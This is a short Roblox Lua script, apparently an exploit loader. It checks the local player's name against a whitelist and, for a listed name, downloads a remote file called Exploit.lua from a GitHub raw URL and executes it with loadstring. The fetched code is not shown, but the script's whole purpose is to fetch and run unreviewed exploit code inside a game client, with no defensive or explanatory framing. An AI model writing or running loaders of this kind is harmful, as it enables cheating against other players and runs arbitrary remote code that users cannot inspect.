local player = game.Players.LocalPlayer
local whitelistedpeople = {
    "0owah"
 
}
for i,v in pairs (whitelistedpeople) do
    if player.Name == v then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kyzwtf/Rawiri/main/Exploit.lua",true))();
    end
end
